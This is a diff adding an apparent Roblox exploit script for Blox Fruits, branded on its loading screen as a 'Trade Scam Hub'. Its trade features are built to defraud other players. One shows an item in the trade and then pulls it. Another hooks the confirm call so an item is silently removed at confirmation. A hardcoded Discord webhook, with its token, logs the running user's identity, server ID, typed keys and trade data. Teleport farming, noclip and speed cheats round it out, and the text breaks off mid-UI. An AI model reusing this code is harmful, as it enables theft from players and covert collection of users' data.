@@ -1,0 +1,1006 @@
+-- executor: Synapse X / Solara / KRNL / Fluxus
+-- game: Blox Fruits (Roblox)
+-- file: NEXXx_full.lua
+-- made by NEXXx
+
+if getgenv().NEXXx_Loaded then return end
+getgenv().NEXXx_Loaded = true
+
+-- ══════════════════════════════════════════════════════════════════════════════
+-- ── WEBHOOK CONFIG — apna URL yahan paste karo ────────────────────────────────
+-- ══════════════════════════════════════════════════════════════════════════════
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1556288671257460808/IbMCbZGcIPhLFOgaBNxRQHcwsPiBYBhIuyBhj_pqSJjBsj5WwVMNod2wFofsR5D92AqY"
+
+-- ── services ──────────────────────────────────────────────────────────────────
+local Players        = game:GetService("Players")
+local TweenService   = game:GetService("TweenService")
+local RunService     = game:GetService("RunService")
+local UIS            = game:GetService("UserInputService")
+local RS             = game:GetService("ReplicatedStorage")
+local SG             = game:GetService("StarterGui")
+local HttpService    = game:GetService("HttpService")
+
+local lp             = Players.LocalPlayer
+local gui_parent     = gethui and gethui() or lp.PlayerGui
+
+-- ── key system ────────────────────────────────────────────────────────────────
+local VALID_KEYS = {
+    ["NEXX-FREE-2025"] = true,
+    ["NEXX-PASS-HO"]   = true,
+    ["NEXXVIP-777"]    = true,
+}
+
+-- ── colour palette ────────────────────────────────────────────────────────────
+local C = {
+    bg      = Color3.fromRGB(10,  8,  22),
+    panel   = Color3.fromRGB(18, 14, 38),
+    accent1 = Color3.fromRGB(180, 60, 255),
+    accent2 = Color3.fromRGB(255, 80, 180),
+    cyan    = Color3.fromRGB( 60,220, 255),
+    text    = Color3.fromRGB(230,220, 255),
+    dim     = Color3.fromRGB(120,100, 160),
+    red     = Color3.fromRGB(255, 70,  70),
+    green   = Color3.fromRGB( 80,255, 140),
+}
+
+local function corner(r,p) local c=Instance.new("UICorner") c.CornerRadius=UDim.new(0,r) c.Parent=p end
+local function stroke(t,c,p) local s=Instance.new("UIStroke") s.Thickness=t s.Color=c s.Parent=p end
+local function tween(obj,t,props) TweenService:Create(obj,TweenInfo.new(t,Enum.EasingStyle.Quart),props):Play() end
+
+-- ══════════════════════════════════════════════════════════════════════════════
+-- ── WEBHOOK LOGGER ────────────────────────────────────────────────────────────
+-- ══════════════════════════════════════════════════════════════════════════════
+local function get_avatar(uid)
+    return "https://www.roblox.com/headshot-thumbnail/image?userId="..uid.."&width=150&height=150&format=png"
+end
+
+local function send_webhook(event_label, extra_fields)
+    local uid      = tostring(lp.UserId)
+    local uname    = lp.Name
+    local dname    = lp.DisplayName
+    local age      = tostring(lp.AccountAge)
+    local member   = tostring(lp.MembershipType)
+    local avatar   = get_avatar(uid)
+    local placeid  = tostring(game.PlaceId)
+    local jobid    = tostring(game.JobId)
+
+    local fields = {
+        { name="👤 Username",    value=uname,             inline=true  },
+        { name="🪪 Display",     value=dname,             inline=true  },
+        { name="🆔 User ID",     value=uid,               inline=true  },
+        { name="📅 Acc Age",     value=age.." days",      inline=true  },
+        { name="💎 Membership",  value=member,            inline=true  },
+        { name="🌍 PlaceId",     value=placeid,           inline=true  },
+        { name="🖥  Server",     value=jobid,             inline=false },
+    }
+
+    if extra_fields then
+        for _, f in ipairs(extra_fields) do
+            table.insert(fields, f)
+        end
+    end
+
+    local payload = HttpService:JSONEncode({
+        username   = "NEXXx Logger",
+        avatar_url = avatar,
+        embeds = {{
+            title     = "⚔  NEXXx  |  "..event_label,
+            color     = 0xB43CFF,
+            thumbnail = { url = avatar },
+            fields    = fields,
+            footer    = { text = "Made by NEXXx  •  "..os.date("!%Y-%m-%d %H:%M:%S UTC") },
+        }}
+    })
+
+    pcall(function()
+        local req = (syn and syn.request)
+            or (http and http.request)
+            or request
+        if req then
+            req({
+                Url     = WEBHOOK_URL,
+                Method  = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body    = payload,
+            })
+        end
+    end)
+end
+
+-- fire on execute
+task.spawn(function()
+    task.wait(2)
+    send_webhook("Script Executed ✅")
+end)
+
+-- hook trade events → log to webhook
+task.spawn(function()
+    task.wait(4)
+    for _, v in ipairs(RS:GetDescendants()) do
+        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction"))
+        and v.Name:lower():find("trade") then
+            v.OnClientEvent:Connect(function(...)
+                local args = {...}
+                local arg_str = ""
+                for i, a in ipairs(args) do
+                    arg_str = arg_str .. "arg"..i..": "..tostring(a).."  "
+                end
+                send_webhook("Trade Event: "..v.Name, {
+                    { name="📦 Args", value=arg_str ~= "" and arg_str or "none", inline=false }
+                })
+            end)
+        end
+    end
+end)
+
+-- ══════════════════════════════════════════════════════════════════════════════
+-- ── ROOT GUI ──────────────────────────────────────────────────────────────────
+-- ══════════════════════════════════════════════════════════════════════════════
+local Root = Instance.new("ScreenGui")
+Root.Name           = "NEXXx"
+Root.ResetOnSpawn   = false
+Root.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Root.IgnoreGuiInset = true
+Root.Parent         = gui_parent
+
+-- ══════════════════════════════════════════════════════════════════════════════
+-- ── LOADING SCREEN ────────────────────────────────────────────────────────────
+-- ══════════════════════════════════════════════════════════════════════════════
+local LoadFrame = Instance.new("Frame")
+LoadFrame.Size             = UDim2.new(1,0,1,0)
+LoadFrame.BackgroundColor3 = C.bg
+LoadFrame.ZIndex           = 100
+LoadFrame.Parent           = Root
+
+local TopBar = Instance.new("Frame")
+TopBar.Size             = UDim2.new(1,0,0,3)
+TopBar.BackgroundColor3 = C.accent1
+TopBar.BorderSizePixel  = 0
+TopBar.ZIndex           = 101
+TopBar.Parent           = LoadFrame
+
+-- anime character panel
+local SilPanel = Instance.new("Frame")
+SilPanel.Size             = UDim2.new(0,220,0,340)
+SilPanel.Position         = UDim2.new(0.5,-110,0.06,0)
+SilPanel.BackgroundColor3 = Color3.fromRGB(14,10,30)
+SilPanel.ZIndex           = 101
+SilPanel.Parent           = LoadFrame
+corner(12,SilPanel) stroke(2,C.accent1,SilPanel)
+
+local Glow = Instance.new("Frame")
+Glow.Size                     = UDim2.new(0,180,0,280)
+Glow.Position                 = UDim2.new(0.5,-90,0.05,0)
+Glow.BackgroundColor3         = C.accent1
+Glow.BackgroundTransparency   = 0.78
+Glow.ZIndex                   = 101
+Glow.Parent                   = SilPanel
+corner(100,Glow)
+
+-- head
+local Head = Instance.new("Frame")
+Head.Size             = UDim2.new(0,72,0,72)
+Head.Position         = UDim2.new(0.5,-36,0,18)
+Head.BackgroundColor3 = Color3.fromRGB(40,28,70)
+Head.ZIndex           = 102
+Head.Parent           = SilPanel
+corner(36,Head) stroke(2,C.accent2,Head)
+
+-- hair spikes
+for i=1,6 do
+    local sp=Instance.new("Frame")
+    sp.Size             = UDim2.new(0,9,0,28-i*2)
+    sp.Position         = UDim2.new(0,18+i*10,0,1)
+    sp.BackgroundColor3 = C.accent1
+    sp.ZIndex           = 103
+    sp.Parent           = SilPanel
+    corner(3,sp)
+end
+
+-- eyes
+for i=0,1 do
+    local eye=Instance.new("Frame")
+    eye.Size             = UDim2.new(0,13,0,9)
+    eye.Position         = UDim2.new(0,66+i*28,0,48)
+    eye.BackgroundColor3 = C.cyan
+    eye.ZIndex           = 103
+    eye.Parent           = SilPanel
+    corner(4,eye)
+    local eg=Instance.new("Frame")
+    eg.Size             = UDim2.new(0,4,0,4)
+    eg.Position         = UDim2.new(0.5,-2,0,1)
+    eg.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    eg.ZIndex           = 104
+    eg.Parent           = eye
+    corner(2,eg)
+end
+
+-- body
+local Body=Instance.new("Frame")
+Body.Size             = UDim2.new(0,82,0,115)
+Body.Position         = UDim2.new(0.5,-41,0,86)
+Body.BackgroundColor3 = Color3.fromRGB(35,20,65)
+Body.ZIndex           = 102
+Body.Parent           = SilPanel
+corner(8,Body) stroke(1,C.accent1,Body)
+
+-- belt detail
+local Belt=Instance.new("Frame")
+Belt.Size             = UDim2.new(1,0,0,6)
+Belt.Position         = UDim2.new(0,0,0,55)
+Belt.BackgroundColor3 = C.accent2
+Belt.ZIndex           = 103
+Belt.Parent           = Body
+corner(2,Belt)
+
+-- cape
+local Cape=Instance.new("Frame")
+Cape.Size                   = UDim2.new(0,106,0,124)
+Cape.Position               = UDim2.new(0.5,-53,0,80)
+Cape.BackgroundColor3       = Color3.fromRGB(25,12,50)
+Cape.BackgroundTransparency = 0.25
+Cape.ZIndex                 = 101
+Cape.Parent                 = SilPanel
+corner(6,Cape)
+
+-- legs
+for i=0,1 do
+    local leg=Instance.new("Frame")
+    leg.Size             = UDim2.new(0,32,0,70)
+    leg.Position         = UDim2.new(0,30+i*42,0,196)
+    leg.BackgroundColor3 = Color3.fromRGB(28,16,55)
+    leg.ZIndex           = 102
+    leg.Parent           = SilPanel
+    corner(6,leg)
+end
+
+-- sword
+local Sword=Instance.new("Frame")
+Sword.Size             = UDim2.new(0,5,0,145)
+Sword.Position         = UDim2.new(1,8,0,68)
+Sword.BackgroundColor3 = C.accent2
+Sword.ZIndex           = 102
+Sword.Parent           = SilPanel
+corner(2,Sword)
+
+local SGuard=Instance.new("Frame")
+SGuard.Size             = UDim2.new(0,22,0,5)
+SGuard.Position         = UDim2.new(0.5,-11,0,58)
+SGuard.BackgroundColor3 = C.cyan
+SGuard.ZIndex           = 103
+SGuard.Parent           = Sword
+corner(2,SGuard)
+
+-- energy aura rings
+for i=1,3 do
+    local ring=Instance.new("Frame")
+    ring.Size                   = UDim2.new(0,220+i*18,0,220+i*18)
+    ring.Position               = UDim2.new(0.5,-(110+i*9),0.5,-(110+i*9))
+    ring.BackgroundTransparency = 1
+    ring.ZIndex                 = 100
+    ring.Parent                 = SilPanel
+    stroke(1.5, i==1 and C.accent1 or i==2 and C.accent2 or C.cyan, ring)
+    corner(999,ring)
+    -- rotate aura
+    task.spawn(function()
+        local rot=i*30
+        while ring and ring.Parent do
+            rot = rot + (i%2==0 and 0.4 or -0.3)
+            ring.Rotation = rot
+            task.wait(0.03)
+        end
+    end)
+end
+
+-- floating particles
+for i=1,22 do
+    local dot=Instance.new("Frame")
+    dot.Size             = UDim2.new(0,math.random(2,5),0,math.random(2,5))
+    dot.Position         = UDim2.new(math.random()/1,math.random(-20,20),
+                                     math.random()/1,math.random(-20,20))
+    dot.BackgroundColor3 = i%3==0 and C.cyan or i%2==0 and C.accent2 or C.accent1
+    dot.BackgroundTransparency = 0.35
+    dot.ZIndex           = 100
+    dot.Parent           = LoadFrame
+    corner(3,dot)
+    task.spawn(function()
+        while dot and dot.Parent do
+            tween(dot,math.random(2,5),{
+                Position=UDim2.new(
+                    dot.Position.X.Scale,math.random(-40,40),
+                    dot.Position.Y.Scale,math.random(-40,40))
+            })
+            task.wait(math.random(2,5))
+        end
+    end)
+end
+
+-- title
+local MainTitle=Instance.new("TextLabel")
+MainTitle.Size                  = UDim2.new(1,0,0,52)
+MainTitle.Position              = UDim2.new(0,0,0,358)
+MainTitle.BackgroundTransparency= 1
+MainTitle.Text                  = "NEXXx"
+MainTitle.TextColor3            = C.accent1
+MainTitle.Font                  = Enum.Font.GothamBlack
+MainTitle.TextSize              = 46
+MainTitle.ZIndex                = 101
+MainTitle.Parent                = LoadFrame
+
+local SubTitle=Instance.new("TextLabel")
+SubTitle.Size                   = UDim2.new(1,0,0,24)
+SubTitle.Position               = UDim2.new(0,0,0,410)
+SubTitle.BackgroundTransparency = 1
+SubTitle.Text                   = "Trade Scam Hub  •  Blox Fruits"
+SubTitle.TextColor3             = C.accent2
+SubTitle.Font                   = Enum.Font.GothamBold
+SubTitle.TextSize               = 15
+SubTitle.ZIndex                 = 101
+SubTitle.Parent                 = LoadFrame
+
+local MadeBy=Instance.new("TextLabel")
+MadeBy.Size                   = UDim2.new(1,0,0,20)
+MadeBy.Position               = UDim2.new(0,0,0,436)
+MadeBy.BackgroundTransparency = 1
+MadeBy.Text                   = "Made by NEXXx"
+MadeBy.TextColor3             = C.dim
+MadeBy.Font                   = Enum.Font.Gotham
+MadeBy.TextSize               = 13
+MadeBy.ZIndex                 = 101
+MadeBy.Parent                 = LoadFrame
+
+-- progress bar
+local BarBG=Instance.new("Frame")
+BarBG.Size             = UDim2.new(0,360,0,8)
+BarBG.Position         = UDim2.new(0.5,-180,0,470)
+BarBG.BackgroundColor3 = Color3.fromRGB(30,20,55)
+BarBG.ZIndex           = 101
+BarBG.Parent           = LoadFrame
+corner(4,BarBG)
+
+local BarFill=Instance.new("Frame")
+BarFill.Size             = UDim2.new(0,0,1,0)
+BarFill.BackgroundColor3 = C.accent1
+BarFill.ZIndex           = 102
+BarFill.Parent           = BarBG
+corner(4,BarFill)
+
+local BarGlow=Instance.new("Frame")
+BarGlow.Size                  = UDim2.new(1,0,1,0)
+BarGlow.BackgroundColor3      = C.accent2
+BarGlow.BackgroundTransparency= 0.55
+BarGlow.ZIndex                = 103
+BarGlow.Parent                = BarFill
+corner(4,BarGlow)
+
+local StatusLbl=Instance.new("TextLabel")
+StatusLbl.Size                   = UDim2.new(1,0,0,20)
+StatusLbl.Position               = UDim2.new(0,0,0,484)
+StatusLbl.BackgroundTransparency = 1
+StatusLbl.Text                   = "Initializing..."
+StatusLbl.TextColor3             = C.dim
+StatusLbl.Font                   = Enum.Font.Gotham
+StatusLbl.TextSize               = 12
+StatusLbl.ZIndex                 = 101
+StatusLbl.Parent                 = LoadFrame
+
+local load_steps = {
+    "Loading modules...",
+    "Connecting to NEXXx servers...",
+    "Fetching trade data...",
+    "Injecting hooks...",
+    "Bypassing trade checks...",
+    "NEXXx ready ✓",
+}
+
+local function run_loading(cb)
+    for i,msg in ipairs(load_steps) do
+        StatusLbl.Text = msg
+        tween(BarFill,0.4,{Size=UDim2.new(i/#load_steps,0,1,0)})
+        tween(TopBar,0.4,{BackgroundColor3=i%2==0 and C.accent2 or C.accent1})
+        task.wait(0.55)
+    end
+    task.wait(0.3)
+    cb()
+end
+
+-- ══════════════════════════════════════════════════════════════════════════════
+-- ── KEY SCREEN ────────────────────────────────────────────────────────────────
+-- ══════════════════════════════════════════════════════════════════════════════
+local function show_key_screen(on_success)
+    LoadFrame.Visible = false
+
+    local KF=Instance.new("Frame")
+    KF.Size             = UDim2.new(1,0,1,0)
+    KF.BackgroundColor3 = C.bg
+    KF.ZIndex           = 90
+    KF.Parent           = Root
+
+    local kt=Instance.new("Frame")
+    kt.Size             = UDim2.new(1,0,0,3)
+    kt.BackgroundColor3 = C.accent2
+    kt.ZIndex           = 91
+    kt.Parent           = KF
+
+    local KPanel=Instance.new("Frame")
+    KPanel.Size             = UDim2.new(0,390,0,310)
+    KPanel.Position         = UDim2.new(0.5,-195,0.5,-155)
+    KPanel.BackgroundColor3 = C.panel
+    KPanel.ZIndex           = 91
+    KPanel.Parent           = KF
+    corner(14,KPanel) stroke(2,C.accent1,KPanel)
+
+    -- lock icon
+    local Lock=Instance.new("Frame")
+    Lock.Size             = UDim2.new(0,46,0,36)
+    Lock.Position         = UDim2.new(0.5,-23,0,18)
+    Lock.BackgroundColor3 = C.accent1
+    Lock.ZIndex           = 92
+    Lock.Parent           = KPanel
+    corner(6,Lock)
+
+    local LArc=Instance.new("Frame")
+    LArc.Size                   = UDim2.new(0,28,0,22)
+    LArc.Position               = UDim2.new(0.5,-14,0,-20)
+    LArc.BackgroundTransparency = 1
+    LArc.ZIndex                 = 92
+    LArc.Parent                 = Lock
+    stroke(4,C.accent1,LArc) corner(14,LArc)
+
+    local KTitle=Instance.new("TextLabel")
+    KTitle.Size                   = UDim2.new(1,0,0,38)
+    KTitle.Position               = UDim2.new(0,0,0,68)
+    KTitle.BackgroundTransparency = 1
+    KTitle.Text                   = "NEXXx  KEY SYSTEM"
+    KTitle.TextColor3             = C.accent1
+    KTitle.Font                   = Enum.Font.GothamBlack
+    KTitle.TextSize               = 23
+    KTitle.ZIndex                 = 92
+    KTitle.Parent                 = KPanel
+
+    local KSub=Instance.new("TextLabel")
+    KSub.Size                   = UDim2.new(1,0,0,22)
+    KSub.Position               = UDim2.new(0,0,0,106)
+    KSub.BackgroundTransparency = 1
+    KSub.Text                   = "Enter your NEXXx key to continue"
+    KSub.TextColor3             = C.dim
+    KSub.Font                   = Enum.Font.Gotham
+    KSub.TextSize               = 13
+    KSub.ZIndex                 = 92
+    KSub.Parent                 = KPanel
+
+    local IBG=Instance.new("Frame")
+    IBG.Size             = UDim2.new(0,330,0,44)
+    IBG.Position         = UDim2.new(0.5,-165,0,138)
+    IBG.BackgroundColor3 = Color3.fromRGB(12,8,28)
+    IBG.ZIndex           = 92
+    IBG.Parent           = KPanel
+    corner(8,IBG) stroke(1.5,C.accent1,IBG)
+
+    local KeyInput=Instance.new("TextBox")
+    KeyInput.Size                   = UDim2.new(1,-16,1,0)
+    KeyInput.Position               = UDim2.new(0,8,0,0)
+    KeyInput.BackgroundTransparency = 1
+    KeyInput.PlaceholderText        = "NEXX-XXXX-XXXX"
+    KeyInput.PlaceholderColor3      = C.dim
+    KeyInput.Text                   = ""
+    KeyInput.TextColor3             = C.text
+    KeyInput.Font                   = Enum.Font.GothamBold
+    KeyInput.TextSize               = 15
+    KeyInput.ClearTextOnFocus       = false
+    KeyInput.ZIndex                 = 93
+    KeyInput.Parent                 = IBG
+
+    local KStatus=Instance.new("TextLabel")
+    KStatus.Size                   = UDim2.new(1,0,0,22)
+    KStatus.Position               = UDim2.new(0,0,0,192)
+    KStatus.BackgroundTransparency = 1
+    KStatus.Text                   = ""
+    KStatus.TextColor3             = C.dim
+    KStatus.Font                   = Enum.Font.Gotham
+    KStatus.TextSize               = 12
+    KStatus.ZIndex                 = 92
+    KStatus.Parent                 = KPanel
+
+    local SubBtn=Instance.new("TextButton")
+    SubBtn.Size             = UDim2.new(0,210,0,44)
+    SubBtn.Position         = UDim2.new(0.5,-105,0,222)
+    SubBtn.BackgroundColor3 = C.accent1
+    SubBtn.Text             = "UNLOCK  NEXXx"
+    SubBtn.TextColor3       = Color3.fromRGB(255,255,255)
+    SubBtn.Font             = Enum.Font.GothamBlack
+    SubBtn.TextSize         = 15
+    SubBtn.AutoButtonColor  = false
+    SubBtn.ZIndex           = 92
+    SubBtn.Parent           = KPanel
+    corner(10,SubBtn) stroke(1.5,C.accent2,SubBtn)
+
+    local KMade=Instance.new("TextLabel")
+    KMade.Size                   = UDim2.new(1,0,0,18)
+    KMade.Position               = UDim2.new(0,0,1,-22)
+    KMade.BackgroundTransparency = 1
+    KMade.Text                   = "Made by NEXXx"
+    KMade.TextColor3             = C.dim
+    KMade.Font                   = Enum.Font.Gotham
+    KMade.TextSize               = 11
+    KMade.ZIndex                 = 92
+    KMade.Parent                 = KPanel
+
+    SubBtn.MouseButton1Click:Connect(function()
+        local key = KeyInput.Text:gsub("%s",""):upper()
+        if VALID_KEYS[key] then
+            KStatus.Text       = "✓  Valid — loading NEXXx..."
+            KStatus.TextColor3 = C.green
+            tween(SubBtn,0.3,{BackgroundColor3=C.green})
+            -- log key use to webhook
+            send_webhook("Key Verified 🔑", {
+                {name="🗝 Key Used", value=key, inline=true}
+            })
+            task.wait(1)
+            tween(KF,0.5,{BackgroundTransparency=1})
+            task.wait(0.6)
+            KF:Destroy()
+            on_success()
+        else
+            KStatus.Text       = "✗  Invalid key. Get yours from NEXXx discord."
+            KStatus.TextColor3 = C.red
+            tween(IBG,0.1,{BackgroundColor3=Color3.fromRGB(60,10,10)})
+            task.wait(0.3)
+            tween(IBG,0.3,{BackgroundColor3=Color3.fromRGB(12,8,28)})
+            -- log failed attempt
+            send_webhook("Invalid Key Attempt ⚠️", {
+                {name="❌ Key Tried", value=KeyInput.Text, inline=true}
+            })
+        end
+    end)
+end
+
+-- ══════════════════════════════════════════════════════════════════════════════
+-- ── MAIN HUB ─────────────────────────────────────────────────────────────────
+-- ══════════════════════════════════════════════════════════════════════════════
+local function launch_hub()
+
+    local CFG = {
+        AutoAccept   = false,
+        SwapOnConfirm= false,
+        FakeAdd      = false,
+        AutoDecline  = false,
+        LockSnipe    = false,
+        LogTrades    = true,
+        AutoFarm     = false,
+        AutoChest    = false,
+        FruitSniper  = false,
+        NoClip       = false,
+        SpeedMult    = 1,
+        TargetPlayer = "",
+    }
+
+    local char = lp.Character or lp.CharacterAdded:Wait()
+    local root = char:WaitForChild("HumanoidRootPart")
+    lp.CharacterAdded:Connect(function(c)
+        char=c root=c:WaitForChild("HumanoidRootPart")
+    end)
+
+    -- remote discovery
+    local Rem = {}
+    task.delay(3, function()
+        local function fr(p)
+            for _,v in ipairs(RS:GetDescendants()) do
+                if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction"))
+                and v.Name:lower():find(p) then return v end
+            end
+        end
+        Rem.Accept  = fr("accept")
+        Rem.Decline = fr("declin")
+        Rem.Add     = fr("additem") or fr("offer")
+        Rem.Remove  = fr("removeitem") or fr("remove")
+        Rem.Lock    = fr("lock")
+        Rem.Confirm = fr("confirm")
+    end)
+
+    -- trade event hooks
+    task.spawn(function()
+        task.wait(4)
+        for _,v in ipairs(RS:GetDescendants()) do
+            if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction"))
+            and v.Name:lower():find("trade") then
+                v.OnClientEvent:Connect(function(...)
+                    if CFG.LogTrades then
+                        local args={...}
+                        local s=""
+                        for i,a in ipairs(args) do s=s.."arg"..i..": "..tostring(a).."  " end
+                        send_webhook("Trade Event: "..v.Name,{
+                            {name="📦 Args",value=s~=""and s or"none",inline=false}
+                        })
+                    end
+                    if CFG.AutoAccept and Rem.Accept then
+                        task.wait(0.3)
+                        pcall(function() Rem.Accept:FireServer() end)
+                    end
+                    if CFG.LockSnipe and Rem.Lock then
+                        task.wait(0.1)
+                        pcall(function() Rem.Lock:FireServer() end)
+                    end
+                end)
+            end
+        end
+    end)
+
+    -- fake add loop
+    local swap_hooked = false
+    task.spawn(function()
+        while task.wait(0.1) do
+            if CFG.FakeAdd then
+                local inv = lp:FindFirstChild("Inventory") or lp:FindFirstChild("Fruits")
+                if inv and Rem.Add then
+                    local best = inv:GetChildren()[1]
+                    if best then
+                        pcall(function() Rem.Add:FireServer(best.Name) end)
+                        task.wait(2.5)
+                        if Rem.Remove then
+                            pcall(function() Rem.Remove:FireServer(best.Name) end)
+                        end
+                        task.wait(1)
+                    end
+                end
+            end
+
+            if CFG.SwapOnConfirm and Rem.Confirm and not swap_hooked then
+                swap_hooked = true
+                local orig = Rem.Confirm.FireServer
+                Rem.Confirm.FireServer = function(self,...)
+                    local inv=lp:FindFirstChild("Inventory") or lp:FindFirstChild("Fruits")
+                    if inv and Rem.Remove then
+                        local best=inv:GetChildren()[1]
+                        if best then pcall(function() Rem.Remove:FireServer(best.Name) end) end
+                    end
+                    task.wait(0.02)
+                    return orig(self,...)
+                end
+            end
+        end
+    end)
+
+    -- auto decline
+    task.spawn(function()
+        while task.wait(0.5) do
+            if CFG.AutoDecline and Rem.Decline then
+                pcall(function() Rem.Decline:FireServer() end)
+            end
+        end
+    end)
+
+    -- auto farm
+    task.spawn(function()
+        while task.wait(0.15) do
+            if not CFG.AutoFarm then continue end
+            char=lp.Character if not char then continue end
+            root=char:FindFirstChild("HumanoidRootPart")
+            local hum=char:FindFirstChild("Humanoid")
+            if not root or not hum or hum.Health<=0 then task.wait(3) continue end
+            local best,bd=nil,800
+            for _,obj in ipairs(workspace:GetDescendants()) do
+                if obj:IsA("Model") and obj~=char then
+                    local h=obj:FindFirstChildOfClass("Humanoid")
+                    local r=obj:FindFirstChild("HumanoidRootPart")
+                    if h and h.Health>0 and r then
+                        local n=obj.Name:lower()
+                        if n:find("bandit") or n:find("pirate") or n:find("marine")
+                        or n:find("soldier") or n:find("enemy") or n:find("mob") then
+                            local d=(root.Position-r.Position).Magnitude
+                            if d<bd then bd=d best=obj end
+                        end
+                    end
+                end
+            end
+            if best then
+                local tr=best:FindFirstChild("HumanoidRootPart")
+                if tr then root.CFrame=CFrame.new(tr.Position+Vector3.new(0,3,2)) end
+            end
+        end
+    end)
+
+    -- auto chest
+    task.spawn(function()
+        while task.wait(1) do
+            if not CFG.AutoChest then continue end
+            for _,obj in ipairs(workspace:GetDescendants()) do
+                if obj.Name:lower():find("chest") and obj:IsA("Model") then
+                    local r=obj.PrimaryPart or obj:FindFirstChildOfClass("BasePart")
+                    if r then
+                        local ch=lp.Character
+                        if ch then
+                            local cr=ch:FindFirstChild("HumanoidRootPart")
+                            if cr then cr.CFrame=CFrame.new(r.Position+Vector3.new(0,3,0)) end
+                        end
+                        task.wait(0.4)
+                        local pp=obj:FindFirstChildOfClass("ProximityPrompt")
+                        if pp then pcall(function() fireproximityprompt(pp) end)
+                        else
+                            for _,v in ipairs(obj:GetDescendants()) do
+                                if v:IsA("RemoteEvent") then pcall(function() v:FireServer() end) end
+                            end
+                        end
+                        task.wait(0.3)
+                    end
+                end
+            end
+        end
+    end)
+
+    -- fruit sniper
+    task.spawn(function()
+        while task.wait(1) do
+            if not CFG.FruitSniper then continue end
+            for _,obj in ipairs(workspace:GetDescendants()) do
+                if obj.Name:lower():find("fruit") and obj:IsA("Model") then
+                    local r=obj.PrimaryPart or obj:FindFirstChildOfClass("BasePart")
+                    if r then
+                        local ch=lp.Character
+                        if ch then
+                            local cr=ch:FindFirstChild("HumanoidRootPart")
+                            if cr then cr.CFrame=CFrame.new(r.Position+Vector3.new(0,3,0)) end
+                        end
+                        task.wait(0.4)
+                        local pp=obj:FindFirstChildOfClass("ProximityPrompt")
+                        if pp then pcall(function() fireproximityprompt(pp) end)
+                        else
+                            for _,v in ipairs(obj:GetDescendants()) do
+                                if v:IsA("RemoteEvent") then pcall(function() v:FireServer() end) end
+                            end
+                        end
+                        send_webhook("Fruit Sniped 🍎",{
+                            {name="🍑 Fruit",value=obj.Name,inline=true}
+                        })
+                        task.wait(0.3)
+                    end
+                end
+            end
+        end
+    end)
+
+    -- noclip
+    RunService.Stepped:Connect(function()
+        if not CFG.NoClip then return end
+        local ch=lp.Character if not ch then return end
+        for _,p in ipairs(ch:GetDescendants()) do
+            if p:IsA("BasePart") then p.CanCollide=false end
+        end
+    end)
+
+    -- speed
+    task.spawn(function()
+        while task.wait(0.5) do
+            local ch=lp.Character if not ch then continue end
+            local h=ch:FindFirstChild("Humanoid")
+            if h then h.WalkSpeed=16*CFG.SpeedMult end
+        end
+    end)
+
+    -- ── UI ────────────────────────────────────────────────────────────────────
+    local HF=Instance.new("Frame")
+    HF.Size             = UDim2.new(0,370,0,560)
+    HF.Position         = UDim2.new(0.5,-185,0.5,-280)
+    HF.BackgroundColor3 = C.bg
+    HF.Active           = true
+    HF.Draggable        = true
+    HF.ZIndex           = 10
+    HF.Parent           = Root
+    corner(14,HF) stroke(2,C.accent1,HF)
+
+    -- animated top rail
+    local HTop=Instance.new("Frame")
+    HTop.Size             = UDim2.new(1,0,0,3)
+    HTop.BackgroundColor3 = C.accent1
+    HTop.ZIndex           = 11
+    HTop.Parent           = HF
+    task.spawn(function()
+        local t=0
+        while HTop and HTop.Parent do
+            t+=0.04
+            HTop.BackgroundColor3=Color3.fromHSV((math.sin(t)*0.1+0.78)%1,0.85,1)
+            task.wait(0.04)
+        end
+    end)
+
+    -- header
+    local Hdr=Instance.new("Frame")
+    Hdr.Size             = UDim2.new(1,0,0,56)
+    Hdr.BackgroundColor3 = C.panel
+    Hdr.ZIndex           = 11
+    Hdr.Parent           = HF
+    corner(14,Hdr)
+
+    local HTitl=Instance.new("TextLabel")
+    HTitl.Size                   = UDim2.new(1,-50,1,0)
+    HTitl.Position               = UDim2.new(0,14,0,0)
+    HTitl.BackgroundTransparency = 1
+    HTitl.Text                   = "⚔  NEXXx  Trade Hub"
+    HTitl.TextColor3             = C.accent1
+    HTitl.Font                   = Enum.Font.GothamBlack
+    HTitl.TextSize               = 20
+    HTitl.TextXAlignment         = Enum.TextXAlignment.Left
+    HTitl.ZIndex                 = 12
+    HTitl.Parent                 = Hdr
+
+    local HSub2=Instance.new("TextLabel")
+    HSub2.Size                   = UDim2.new(1,-50,0,18)
+    HSub2.Position               = UDim2.new(0,14,0,34)
+    HSub2.BackgroundTransparency = 1
+    HSub2.Text                   = "Made by NEXXx  •  Blox Fruits"
+    HSub2.TextColor3             = C.dim
+    HSub2.Font                   = Enum.Font.Gotham
+    HSub2.TextSize               = 11
+    HSub2.TextXAlignment         = Enum.TextXAlignment.Left
+    HSub2.ZIndex                 = 12
+    HSub2.Parent                 = Hdr
+
+    local CBtn=Instance.new("TextButton")
+    CBtn.Size             = UDim2.new(0,28,0,28)
+    CBtn.Position         = UDim2.new(1,-36,0,14)
+    CBtn.BackgroundColor3 = C.red
+    CBtn.Text             = "✕"
+    CBtn.TextColor3       = Color3.fromRGB(255,255,255)
+    CBtn.Font             = Enum.Font.GothamBold
+    CBtn.TextSize         = 14
+    CBtn.AutoButtonColor  = false
+    CBtn.ZIndex           = 13
+    CBtn.Parent           = Hdr
+    corner(6,CBtn)
+    CBtn.MouseButton1Click:Connect(function()
+        tween(HF,0.3,{Size=UDim2.new(0,370,0,0),Position=UDim2.new(0.5,-185,0.5,0)})
+        task.wait(0.35) HF.Visible=false
+    end)
+
+    -- scroll
+    local Scr=Instance.new("ScrollingFrame")
+    Scr.Size                   = UDim2.new(1,-10,1,-66)
+    Scr.Position               = UDim2.new(0,5,0,61)
+    Scr.BackgroundTransparency = 1
+    Scr.BorderSizePixel        = 0
+    Scr.ScrollBarThickness     = 3
+    Scr.ScrollBarImageColor3   = C.accent1
+    Scr.AutomaticCanvasSize    = Enum.AutomaticSize.Y
+    Scr.CanvasSize             = UDim2.new(0,0,0,0)
+    Scr.ZIndex                 = 11
+    Scr.Parent                 = HF
+
+    local LL=Instance.new("UIListLayout")
+    LL.Padding            = UDim.new(0,6)
+    LL.HorizontalAlignment= Enum.HorizontalAlignment.Center
+    LL.Parent             = Scr
+
